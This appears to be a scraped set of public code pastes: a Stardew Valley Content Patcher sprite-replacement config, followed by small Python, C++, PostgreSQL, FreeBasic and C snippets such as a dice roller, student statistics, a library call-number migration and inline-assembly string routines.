    ""When"": {""Tub o' Flowers"": ""true""}
  },
  {
    ""LogName"": ""Dried Sunflowers"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 0, ""Y"": 448, ""Width"": 16, ""Height"": 32},
    ""ToArea"": {""X"": 0, ""Y"": 448, ""Width"": 16, ""Height"": 32},
    ""When"": {""Dried Sunflowers"": ""true""}
  },
  {
    ""LogName"": ""Charcoal Kiln"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 32, ""Y"": 448, ""Width"": 32, ""Height"": 32},
    ""ToArea"": {""X"": 32, ""Y"": 448, ""Width"": 32, ""Height"": 32},
    ""When"": {""Charcoal Kiln"": ""true""}
  },
  {
    ""LogName"": ""Stardew Hero Trophy"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 64, ""Y"": 448, ""Width"": 16, ""Height"": 32},
    ""ToArea"": {""X"": 64, ""Y"": 448, ""Width"": 16, ""Height"": 32},
    ""When"": {""Stardew Hero Trophy"": ""true""}
  },
  {
    ""LogName"": ""Soda Machine"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 80, ""Y"": 448, ""Width"": 16, ""Height"": 32},
    ""ToArea"": {""X"": 80, ""Y"": 448, ""Width"": 16, ""Height"": 32},
    ""When"": {""Soda Machine"": ""true""}
  },
  {
    ""LogName"": ""Statue Of Endless Fortune"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 112, ""Y"": 480, ""Width"": 16, ""Height"": 32},
    ""ToArea"": {""X"": 112, ""Y"": 480, ""Width"": 16, ""Height"": 32},
    ""When"": {""Statue Of Endless Fortune"": ""true""}
  },
  {
    ""LogName"": ""Mushroom"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 0, ""Y"": 512, ""Width"": 32, ""Height"": 32},
    ""ToArea"": {""X"": 0, ""Y"": 512, ""Width"": 32, ""Height"": 32},
    ""When"": {""Mushroom"": ""true""}
  },
  {
    ""LogName"": ""Chest"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 32, ""Y"": 512, ""Width"": 96, ""Height"": 32},
    ""ToArea"": {""X"": 32, ""Y"": 512, ""Width"": 96, ""Height"": 32},
    ""When"": {""Chest"": ""true""}
  },
  {
    ""LogName"": ""Prairie King Arcade System"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 80, ""Y"": 544, ""Width"": 32, ""Height"": 32},
    ""ToArea"": {""X"": 80, ""Y"": 544, ""Width"": 32, ""Height"": 32},
    ""When"": {""Prairie King Arcade System"": ""true""}
  },
  {
    ""LogName"": ""Wooden Brazier"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 112, ""Y"": 544, ""Width"": 16, ""Height"": 32},
    ""ToArea"": {""X"": 112, ""Y"": 544, ""Width"": 16, ""Height"": 32},
    ""When"": {""Wooden Brazier"": ""true""}
  },
  {
    ""LogName"": ""Stone Brazier"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 0, ""Y"": 576, ""Width"": 16, ""Height"": 32},
    ""ToArea"": {""X"": 0, ""Y"": 576, ""Width"": 16, ""Height"": 32},
    ""When"": {""Stone Brazier"": ""true""}
  },
  {
    ""LogName"": ""Gold Brazier"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 16, ""Y"": 576, ""Width"": 16, ""Height"": 32},
    ""ToArea"": {""X"": 16, ""Y"": 576, ""Width"": 16, ""Height"": 32},
    ""When"": {""Gold Brazier"": ""true""}
  },
  {
    ""LogName"": ""Campfire"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 32, ""Y"": 576, ""Width"": 16, ""Height"": 32},
    ""ToArea"": {""X"": 32, ""Y"": 576, ""Width"": 16, ""Height"": 32},
    ""When"": {""Campfire"": ""true""}
  },
  {
    ""LogName"": ""Stump Brazier"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 48, ""Y"": 576, ""Width"": 16, ""Height"": 32},
    ""ToArea"": {""X"": 48, ""Y"": 576, ""Width"": 16, ""Height"": 32},
    ""When"": {""Stump Brazier"": ""true""}
  },
  {
    ""LogName"": ""Carved Brazier"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 64, ""Y"": 576, ""Width"": 16, ""Height"": 32},
    ""ToArea"": {""X"": 64, ""Y"": 576, ""Width"": 16, ""Height"": 32},
    ""When"": {""Carved Brazier"": ""true""}
  },
  {
    ""LogName"": ""Skull Brazier"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 80, ""Y"": 576, ""Width"": 16, ""Height"": 32},
    ""ToArea"": {""X"": 80, ""Y"": 576, ""Width"": 16, ""Height"": 32},
    ""When"": {""Skull Brazier"": ""true""}
  },
  {
    ""LogName"": ""Barrel Brazier"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 96, ""Y"": 576, ""Width"": 16, ""Height"": 32},
    ""ToArea"": {""X"": 96, ""Y"": 576, ""Width"": 16, ""Height"": 32},
    ""When"": {""Barrel Brazier"": ""true""}
  },
  {
    ""LogName"": ""Marble Brazier"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 112, ""Y"": 576, ""Width"": 16, ""Height"": 32},
    ""ToArea"": {""X"": 112, ""Y"": 576, ""Width"": 16, ""Height"": 32},
    ""When"": {""Marble Brazier"": ""true""}
  },
  {
    ""LogName"": ""Wood Lamp-post"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 0, ""Y"": 608, ""Width"": 16, ""Height"": 32},
    ""ToArea"": {""X"": 0, ""Y"": 608, ""Width"": 16, ""Height"": 32},
    ""When"": {""Wood Lamp-post"": ""true""}
  },
  {
    ""LogName"": ""Iron Lamp-post"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 16, ""Y"": 608, ""Width"": 16, ""Height"": 32},
    ""ToArea"": {""X"": 16, ""Y"": 608, ""Width"": 16, ""Height"": 32},
    ""When"": {""Iron Lamp-post"": ""true""}
  },
  {
    ""LogName"": ""Worm Bin"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 32, ""Y"": 608, ""Width"": 16, ""Height"": 32},
    ""ToArea"": {""X"": 32, ""Y"": 608, ""Width"": 16, ""Height"": 32},
    ""When"": {""Worm Bin"": ""true""}
  },
  {
    ""LogName"": ""Slime Incubator"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 64, ""Y"": 608, ""Width"": 32, ""Height"": 32},
    ""ToArea"": {""X"": 64, ""Y"": 608, ""Width"": 32, ""Height"": 32},
    ""When"": {""Slime Incubator"": ""true""}
  },
  {
    ""LogName"": ""Slime Egg-Press"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 96, ""Y"": 608, ""Width"": 16, ""Height"": 32},
    ""ToArea"": {""X"": 96, ""Y"": 608, ""Width"": 16, ""Height"": 32},
    ""When"": {""Slime Egg-Press"": ""true""}
  },
  {
    ""LogName"": ""Junimo Kart Arcade System"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 112, ""Y"": 608, ""Width"": 16, ""Height"": 32},
    ""ToArea"": {""X"": 112, ""Y"": 608, ""Width"": 16, ""Height"": 32},
    ""When"": {""Junimo Kart Arcade System"": ""true""}
  },
  {
    ""LogName"": ""Statue Of Perfection"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 0, ""Y"": 640, ""Width"": 16, ""Height"": 32},
    ""ToArea"": {""X"": 0, ""Y"": 640, ""Width"": 16, ""Height"": 32},
    ""When"": {""Statue Of Perfection"": ""true""}
  },
  {
    ""LogName"": ""Cask"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 48, ""Y"": 640, ""Width"": 16, ""Height"": 32},
    ""ToArea"": {""X"": 48, ""Y"": 640, ""Width"": 16, ""Height"": 32},
    ""When"": {""Cask"": ""true""}
  },
  {
    ""LogName"": ""Auto-Grabber"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 80, ""Y"": 640, ""Width"": 32, ""Height"": 32},
    ""ToArea"": {""X"": 80, ""Y"": 640, ""Width"": 32, ""Height"": 32},
    ""When"": {""Auto-Grabber"": ""true""}
  },
  {
    ""LogName"": ""Chest2"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 0, ""Y"": 672, ""Width"": 96, ""Height"": 64},
    ""ToArea"": {""X"": 0, ""Y"": 672, ""Width"": 96, ""Height"": 64},
    ""When"": {""Chest2"": ""true""}
  },
  {
    ""LogName"": ""Geode Crusher"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 80, ""Y"": 640, ""Width"": 32, ""Height"": 32},
    ""ToArea"": {""X"": 80, ""Y"": 640, ""Width"": 32, ""Height"": 32},
    ""When"": {""Geode Crusher"": ""true""}
  },
  {
    ""LogName"": ""Workbench"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 0, ""Y"": 832, ""Width"": 16, ""Height"": 32},
    ""ToArea"": {""X"": 0, ""Y"": 832, ""Width"": 16, ""Height"": 32},
    ""When"": {""Workbench"": ""true""}
  },
  {
    ""LogName"": ""Jukebox"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 16, ""Y"": 832, ""Width"": 32, ""Height"": 32},
    ""ToArea"": {""X"": 16, ""Y"": 832, ""Width"": 32, ""Height"": 32},
    ""When"": {""Jukebox"": ""true""}
  },
  {
    ""LogName"": ""Wood Chipper"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 48, ""Y"": 832, ""Width"": 48, ""Height"": 32},
    ""ToArea"": {""X"": 48, ""Y"": 832, ""Width"": 48, ""Height"": 32},
    ""When"": {""Wood Chipper"": ""true""}
  },
  {
    ""LogName"": ""Telephone"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 96, ""Y"": 832, ""Width"": 32, ""Height"": 32},
    ""ToArea"": {""X"": 96, ""Y"": 832, ""Width"": 32, ""Height"": 32},
    ""When"": {""Telephone"": ""true""}
  },
  {
    ""LogName"": ""Solar Panel"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 112, ""Y"": 896, ""Width"": 16, ""Height"": 32},
    ""ToArea"": {""X"": 112, ""Y"": 896, ""Width"": 16, ""Height"": 32},
    ""When"": {""Solar Panel"": ""true""}
  },
  {
    ""LogName"": ""Stone Chest"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 0, ""Y"": 928, ""Width"": 96, ""Height"": 64},
    ""ToArea"": {""X"": 0, ""Y"": 928, ""Width"": 96, ""Height"": 64},
    ""When"": {""Stone Chest"": ""true""}
  },
  {
    ""LogName"": ""Mini-Obelisk"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 96, ""Y"": 928, ""Width"": 16, ""Height"": 32},
    ""ToArea"": {""X"": 96, ""Y"": 928, ""Width"": 16, ""Height"": 32},
    ""When"": {""Mini-Obelisk"": ""true""}
  },
  {
    ""LogName"": ""Farm Computer"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 112, ""Y"": 928, ""Width"": 16, ""Height"": 32},
    ""ToArea"": {""X"": 112, ""Y"": 928, ""Width"": 16, ""Height"": 32},
    ""When"": {""Farm Computer"": ""true""}
  },
  {
    ""LogName"": ""Coffee Maker"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 96, ""Y"": 960, ""Width"": 16, ""Height"": 32},
    ""ToArea"": {""X"": 96, ""Y"": 960, ""Width"": 16, ""Height"": 32},
    ""When"": {""Coffee Maker"": ""true""}
  },
  {
    ""LogName"": ""Sewing Machine"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 112, ""Y"": 960, ""Width"": 16, ""Height"": 32},
    ""ToArea"": {""X"": 112, ""Y"": 960, ""Width"": 16, ""Height"": 32},
    ""When"": {""Sewing Machine"": ""true""}
  },
  {
    ""LogName"": ""Mini-Shipping Bin"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 0, ""Y"": 992, ""Width"": 96, ""Height"": 32},
    ""ToArea"": {""X"": 0, ""Y"": 992, ""Width"": 96, ""Height"": 32},
    ""When"": {""Mini-Shipping Bin"": ""true""}
  },
  {
    ""LogName"": ""Ostrich Incubator"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 96, ""Y"": 992, ""Width"": 32, ""Height"": 32},
    ""ToArea"": {""X"": 96, ""Y"": 992, ""Width"": 32, ""Height"": 32},
    ""When"": {""Ostrich Incubator"": ""true""}
  },
  {
    ""LogName"": ""Junimo Chest"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 0, ""Y"": 1024, ""Width"": 96, ""Height"": 32},
    ""ToArea"": {""X"": 0, ""Y"": 1024, ""Width"": 96, ""Height"": 32},
    ""When"": {""Junimo Chest"": ""true""}
  },
  {
    ""LogName"": ""Heavy Tapper"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 0, ""Y"": 1056, ""Width"": 16, ""Height"": 32},
    ""ToArea"": {""X"": 0, ""Y"": 1056, ""Width"": 16, ""Height"": 32},
    ""When"": {""Heavy Tapper"": ""true""}
  },
  {
    ""LogName"": ""Deconstructor"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 16, ""Y"": 1056, ""Width"": 16, ""Height"": 32},
    ""ToArea"": {""X"": 16, ""Y"": 1056, ""Width"": 16, ""Height"": 32},
    ""When"": {""Deconstructor"": ""true""}
  },
  {
    ""LogName"": ""Auto-Petter"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 0, ""Y"": 1088, ""Width"": 48, ""Height"": 32},
    ""ToArea"": {""X"": 0, ""Y"": 1088, ""Width"": 48, ""Height"": 32},
    ""When"": {""Auto-Petter"": ""true""}
  },
  {
    ""LogName"": ""Hopper"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 48, ""Y"": 1088, ""Width"": 48, ""Height"": 32},
    ""ToArea"": {""X"": 48, ""Y"": 1088, ""Width"": 48, ""Height"": 32},
    ""When"": {""Hopper"": ""true""}
  },
  {
    ""LogName"": ""Statue Of True Perfection"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""TileSheets/craftables"",
    ""FromFile"": ""assets/craftable.png"",
    ""FromArea"": {""X"": 0, ""Y"": 1120, ""Width"": 16, ""Height"": 32},
    ""ToArea"": {""X"": 0, ""Y"": 1120, ""Width"": 16, ""Height"": 32},
    ""When"": {""Statue Of True Perfection"": ""true""}
  },
  {
    ""LogName"": ""Loom Rotate"",
    ""Action"": ""EditImage"",
    ""PatchMode"": ""Replace"",
    ""Target"": ""Maps/springobjects"",
    ""FromFile"": ""assets/loom.png"",
    ""FromArea"": {""X"": 0, ""Y"": 0, ""Width"": 16, ""Height"": 16},
    ""ToArea"": {""X"": 48, ""Y"": 288, ""Width"": 16, ""Height"": 16},
    ""When"": {""Loom"": ""true""}
  }
]
}"
SkXNRzzr,Dice,plarmi,Python,Thursday 4th of April 2024 02:52:30 PM CDT,"from tkinter import *
from random import *

def roll():
    dice1 = randint(1, 6)
    dice2 = randint(1, 6)
    dise_label.config(text=f""{dice1} {dice2}\nВсего: {dice1 + dice2}"")

window = Tk()
window.title(""Симулятор броска игральных костей"")
window.geometry(f""400x400+{(window.winfo_screenwidth() // 2) - 200}+{(window.winfo_screenheight() // 2) - 200}"")

dise_label = Label(window, text="""", font=(""Helvetica"", 14))
dise_label.grid(padx=20, pady=50, sticky=""nsew"")

roll_button = Button(window, text=""Бросить"", command=roll)
roll_button.grid(padx=175, pady=175, sticky=""nsew"")

window.mainloop()"
1C9iigun,https://otvet.mail.ru/question/237747076,NickAndNick,C++,Thursday 4th of April 2024 02:48:28 PM CDT,"#include <string>
#include <iostream>
#include <limits>
#include <vector>

using namespace std;

template<typename T>
T input(istream& inp, const char* prompt) {
    cout << prompt;
    T value{};
    inp >> value;
    inp.ignore(0x1000, '\n');
    return value;
}

template<>
string input(istream& inp, const char* prompt) {
    cout << prompt;
    string value;
    getline(inp, value);
    return value;
}

struct Student {
    string name;
    char gender;
    short course;
    float height;
    short mathematics;
    short physics;
    short informatics;
    short chemistry;
    short economy;
    Student() :
        gender(' '),
        course(0),
        height(0.0),
        mathematics(0),
        physics(0),
        informatics(0),
        chemistry(0),
        economy(0) {}
    bool is_same_height(const Student& student) const {
        return height == student.height;
    }
private:
    friend istream& operator>>(istream& inp, Student& student) {
        student.name = input<string>(inp, ""Фамилия: "");
        student.gender = input<char>(inp, ""Пол (м или ж): "");
        student.course = input<short>(inp, ""Курс: "");
        student.height = input<float>(inp, ""Рост: "");
        student.mathematics = input<short>(inp, ""Оценка по математике: "");
        student.physics = input<short>(inp, ""Оценка по физике: "");
        student.informatics = input<short>(inp, ""Оценка по информатике: "");
        student.chemistry = input<short>(inp, ""Оценка по химии: "");
        student.economy = input<short>(inp, ""Оценка по экономике: "");
        return inp;
    }
};

class Students {
public:
    Students(const size_t length) {
        table.resize(length);
    }
    bool is_man() const {
        for (const auto& student : table) {
            if (student.gender == 'м') {
                return true;
            }
        }
        return false;
    }
    Student tallest_man() const {
        Student sample;
        for (const auto& student : table) {
            if (student.gender == 'м' && sample.height < student.height) {
                sample = student;
            }
        }
        return sample;
    }
    Student shortest_man() const {
        Student sample;
        sample.height = numeric_limits<float>::max();
        for (const auto& student : table) {
            if (student.gender == 'м' && student.height < sample.height) {
                sample = student;
            }
        }
        return sample;
    }
    double average_height_of_men() const {
        auto sum = 0.0;
        auto quantity = 0U;
        for (const auto& student : table) {
            if (student.gender == 'м') {
                sum += student.height;
                ++quantity;
            }
        }
        return sum / quantity;
    }
private:
    vector<Student> table;
    friend istream& operator>>(istream& inp, Students& students) {
        for (auto& student : students.table) inp >> student;
        return inp;
    }
};

int main() {
    system(""chcp 1251 > nul"");
    const auto n = input<size_t>(cin, ""Количество студентов: "");
    Students students(n);
    cin >> students;
    if (!students.is_man()) puts(""Мужчин не найдено!"");
    else {
        auto high = students.tallest_man();
        auto low = students.shortest_man();
        if (high.is_same_height(low)) puts(""Все мужчины одинакового роста"");
        else {
            cout.setf(ios::fixed);
            cout.precision(1);
            auto avg = students.average_height_of_men();
            cout << ""Средний рост студентов мужского пола: "" << avg << '\n';
            cout << ""Самый высокий: "" << high.name << "", его рост: "" << high.height << '\n';
            cout << ""Самый низкий: "" << low.name << "", его рост: "" << low.height << '\n';
        }
    }
    system(""pause > nul"");
}"
VHJbTdTZ,Untitled,chrissharp123,PostgreSQL,Thursday 4th of April 2024 02:19:24 PM CDT,"CREATE OR REPLACE FUNCTION csharp.migrate_call_numbers(source_ou INT, dest_ou INT) RETURNS INT AS $func$
DECLARE
    source_org  actor.org_unit%ROWTYPE;
    dest_org    actor.org_unit%ROWTYPE;
    source_cn   asset.call_number%ROWTYPE;
    target_cn   asset.call_number%ROWTYPE;
    hold        action.hold_request%ROWTYPE;

BEGIN

    SELECT INTO source_org *
        FROM actor.org_unit
        WHERE id = source_ou;

    SELECT INTO dest_org *
        FROM actor.org_unit
        WHERE id = dest_ou;

    -- Find call numbers attached to the source org ...
    FOR source_cn IN
        SELECT *
            FROM asset.call_number
            WHERE owning_lib = source_org.id
            AND NOT deleted
    LOOP

    SELECT INTO target_cn *
        FROM  asset.call_number
        WHERE label = source_cn.label
        AND prefix = source_cn.prefix
        AND suffix = source_cn.suffix
        AND owning_lib = dest_org.id
        AND record = source_cn.record
        AND NOT deleted;

    -- ... and if there's a conflicting one on the target ...                                                   
    IF FOUND THEN

            -- ... move the copies to that, and ...                                                             
            UPDATE  asset.copy
              SET   call_number = target_cn.id
              WHERE call_number = source_cn.id;

            -- ... move V holds to the move-target call number                                                  
            FOR hold IN SELECT * FROM action.hold_request WHERE target = source_cn.id AND hold_type = 'V' LOOP

                    UPDATE  action.hold_request
                      SET   target = target_cn.id
                      WHERE id = hold.id;

            END LOOP;

            UPDATE asset.call_number SET deleted = TRUE WHERE id = source_cn.id;

    -- ... if not ...                                                                                           
    ELSE
            -- ... just move the call number to the target org
            UPDATE  asset.call_number
              SET   owning_lib = dest_org.id
              WHERE id = source_cn.id;
    END IF;
    END LOOP;
    RETURN 1;
END;
$func$ LANGUAGE plpgsql;
"
GBTsR9f4,Untitled,Mysoft,FreeBasic,Thursday 4th of April 2024 02:16:24 PM CDT,"dim as string strings = ""hello world""
 do
  color 6
  for i as long = -9 to 8
    if i=0 then color 4 
    locate 1,abs(i)+1,0
    print "" ""+strings+"" "";
    sleep 100
  next i
loop
"
sJt8xpBE,Asterisk pattern solution,CodingComputing,Python,Thursday 4th of April 2024 01:55:05 PM CDT,"# *Asterisk Pattern* solution by @CodingComputing
size = 7  # given parameter, expected to be ODD
center_idx = size // 2  # get the index of the central row/column
for row_idx in range(size):  # to construct each row and print
    if row_idx == center_idx:  # if the row is the central row...
        row_chars = [""*""] * size  # print all *s for the central row
    else:  # for a non-centre row...
        row_chars = ["" ""] * size  # initialization, we'll fill * where needed
        for col_idx in range(size):  # for columns within the current row...
            # check if we are on any of the diagnoals
            is_on_descending_diagonal = col_idx==row_idx
            is_on_ascending_diagonal = col_idx==(size-1-row_idx)
            # -1 is needed because row_idx and col_idx are zero indexed
            is_on_centre_col = col_idx==center_idx  # check if on the central column
            if (
                is_on_ascending_diagonal or
                is_on_descending_diagonal or
                is_on_centre_col
            ):  # Any of these conditions
                row_chars[col_idx] = '*'  # change the initialized space to *
    print("" "".join(row_chars))  # join on a space to get separation
    
# Output:
# 
# *     *     *
#   *   *   *  
#     * * *    
# * * * * * * *
#     * * *    
#   *   *   *  
# *     *     *
"
P167k8ZW,Untitled,den4ik2003,Python,Thursday 4th of April 2024 01:53:59 PM CDT,"import pandas as pd
import json
import re


def parse_balances(path_to_logs):
    list_of_balances_dicts = []
    count_of_decode_errors = 0
    
    with open(path_to_logs, 'r') as logs:
        rows = logs.readlines()
        for row in rows:
            if row.find('balance') != -1:
                try:
                    list_of_balances_dicts.append(json.loads(row[row.find('balance') + len('balance: '):]))
                except json.JSONDecodeError:
                    count_of_decode_errors += 1
    
    return (list_of_balances_dicts, count_of_decode_errors)


def create_balances_csv(path_to_logs, name='mm_balances.csv'):
    balances, errors_count = parse_balances(path_to_logs)
    print(f'balances rows = {len(balances)}; errors count = {errors_count}')
    
    df = pd.DataFrame(balances)
    df['update_time'] = pd.to_datetime(df['update_time'] * 1e6).dt.round('1s')
    df = df.drop_duplicates(subset=['asset', 'update_time']).sort_values('update_time')
    df.to_csv(name, index=False)

    return df"
N52fwUDW,Untitled,dllbridge,C,Thursday 4th of April 2024 01:45:05 PM CDT,"


#ifdef   __GNUC__ 
/////////////////////////////////////////////////////////  -masm=intel
char* asm_strcpy(char *psz1, const char *psz2)         //                
{
	
	__asm(""           mov  esi ,   %1         ;""
	      ""           mov  edi ,   %0         ;""
	      "" L_01:     mov   al , [esi]        ;""	    
	      ""           mov [edi],   al         ;""
	      ""           or    al ,    0         ;""
	      ""           jz   L_02            \n\t""       //  Так тоже можно завершить строку. 
	      ""           inc  esi                ;""
		  ""           inc  edi                ;""	
		  ""           jmp  L_01               ;""
		  "" L_02:                             ;""  		  
		  //    - - - - - - - - - - - - - - - - 
		  // ""m"" = memory
		  :: ""m""(psz1), ""m""(psz2)
		   : ""%eax"", ""%esi"", ""%edi""                    //  Регистры, которые нужно восстановить после использования.    
	      );
	
return psz1;	
}  


/////////////////////////////////////////////////////////  -masm=intel
char* asm_strcat(char *psz1, const char *psz2)         //                
{
	
	__asm(
	      ""           mov  edi ,   %0         ;""
		  ""           dec  edi                ;""	      
	      "" L_00:     inc  edi                ;""	
	      ""           mov   al , [edi]        ;""
	      ""           or    al ,   0          ;""		  	      
	      ""           jnz  L_00               ;""  
	
	      ""           mov  esi ,   %1         ;""
	      
	      "" L_11:     mov   al , [esi]        ;""	    
	      ""           mov [edi],   al         ;""
	      ""           or    al ,    0         ;""
	      ""           jz   L_22            \n\t""       //  Так тоже можно завершить строку. 
	      ""           inc  esi                ;""
		  ""           inc  edi                ;""	
		  ""           jmp  L_11               ;""
		  "" L_22:                             ;""  		  
		  //    - - - - - - - - - - - - - - - - 
		  // ""m"" = memory
		  :: ""m""(psz1), ""m""(psz2)
		   : ""%eax"", ""%esi"", ""%edi""                    //  Регистры, которые нужно восстановить после использования.    
	      );
	
return psz1;	
}  
#endif"
